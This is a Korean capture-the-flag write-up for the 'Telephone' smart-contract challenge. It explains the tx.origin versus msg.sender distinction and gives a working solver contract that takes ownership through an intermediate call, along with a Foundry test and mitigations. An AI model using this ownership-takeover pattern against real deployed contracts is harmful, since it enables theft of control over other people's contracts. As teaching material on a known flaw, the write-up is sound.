# 04. Telephone

[English](../en/04_Telephone.md) | [한국어](04_Telephone.md)

## 문제 목표

`Telephone` 컨트랙트의 소유자가 됩니다.

## 핵심 개념

- `msg.sender`
- `tx.origin`
- 컨트랙트 간 호출
- 호출 체인의 실행 문맥
- 접근 권한 설계
- Foundry의 인자 두 개를 받는 `vm.prank()`

## 컨트랙트 분석

대상 컨트랙트는 `tx.origin`과 `msg.sender`가 다를 때만 소유자를 변경합니다.

```solidity
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}
```

두 전역 변수는 호출 체인의 서로 다른 위치를 나타냅니다.

- `tx.origin`은 트랜잭션을 처음 시작한 외부 소유 계정입니다.
- `msg.sender`는 현재 함수를 직접 호출한 주소입니다.

### 직접 호출

플레이어가 `Telephone.changeOwner()`를 직접 호출하면 두 값은 모두 플레이어입니다.

```text
player → Telephone

tx.origin  = player
msg.sender = player
```

조건이 `false`이므로 소유자가 변경되지 않습니다.

### 중간 컨트랙트를 통한 호출

플레이어가 `TelephoneSolver`를 호출하고 솔버가 다시 `Telephone`을 호출하면 트랜잭션을 시작한 계정은 그대로지만 직접 호출자는 달라집니다.

```text
player → TelephoneSolver → Telephone

tx.origin  = player
msg.sender = TelephoneSolver
```

이제 조건이 `true`가 되어 전달한 주소를 새로운 소유자로 지정할 수 있습니다.

## 솔버 컨트랙트

솔버를 배포할 때 대상 주소를 고정합니다.

```solidity
interface ITelephone {
    function changeOwner(address newOwner) external;
}

contract TelephoneSolver {
    ITelephone public immutable target;

    constructor(address targetAddress) {
        target = ITelephone(targetAddress);
    }

    function solve(address newOwner) external {
        target.changeOwner(newOwner);
    }
}
```

솔버에는 특별한 권한이 필요하지 않습니다. 플레이어와 대상 사이에 컨트랙트 호출 단계를 하나 추가하는 것이 솔버의 역할입니다.

## Foundry 테스트

테스트에서는 인자를 두 개 받는 `vm.prank()`를 사용합니다.

```solidity
vm.prank(player, player);
solver.solve(player);
```

인자의 순서는 다음과 같습니다.

```solidity
vm.prank(msgSender, txOrigin);
```

다음 호출이 시작될 때 두 값은 모두 `player`입니다. 솔버가 `Telephone`을 다시 호출하면 `tx.origin`은 계속 `player`이지만 `msg.sender`는 솔버 주소로 바뀝니다.

테스트는 두 가지 동작을 모두 검증합니다.

1. 플레이어가 직접 호출하면 소유권이 변경되지 않는다.
2. 솔버를 거쳐 호출하면 소유권이 플레이어에게 변경된다.

## 테스트 흐름

```text
Telephone 배포
        ↓
대상 주소를 전달하여 TelephoneSolver 배포
        ↓
msg.sender와 tx.origin을 player로 설정
        ↓
플레이어가 solver.solve(player) 호출
        ↓
솔버가 target.changeOwner(player) 호출
        ↓
Telephone에서 tx.origin != msg.sender 성립
        ↓
owner == player 검증
```

## 취약점의 근본 원인

컨트랙트가 `tx.origin`과 `msg.sender`의 관계를 접근 권한 조건으로 사용합니다. 이 관계는 호출 경로를 보여줄 뿐, 직접 호출자가 신뢰할 수 있는 주소인지 또는 소유권 변경이 명시적으로 승인되었는지를 증명하지 않습니다.

중간 컨트랙트가 원래 트랜잭션 계정은 유지하면서 직접 호출자가 될 수 있으므로 `tx.origin`에 기반한 권한 검사는 신뢰할 수 없습니다.

## 권장 완화 방법

- 접근 권한 검사에 `tx.origin`을 사용하지 않습니다.
- 명시적으로 허용된 주소와 `msg.sender`를 비교합니다.
- 현재 소유자만 소유권을 변경할 수 있도록 제한합니다.
- 필요한 경우 2단계 소유권 이전 방식을 사용합니다.
- OpenZeppelin의 `Ownable`처럼 검증된 접근 제어 컴포넌트를 사용합니다.
- 직접 호출과 중간 컨트랙트를 거치는 호출을 모두 테스트합니다.

## 테스트 실행

```bash
forge test --match-path test/04_Telephone.t.sol -vvv
```

전체 호출 추적을 확인하려면:

```bash
forge test --match-path test/04_Telephone.t.sol -vvvv
```

## 학습 정리

`tx.origin`은 트랜잭션이 시작된 위치를 나타내고 `msg.sender`는 현재 함수를 직접 호출한 주소를 나타냅니다. 원래 트랜잭션 계정만 보고 호출 체인에 포함된 모든 컨트랙트를 신뢰해서는 안 됩니다.
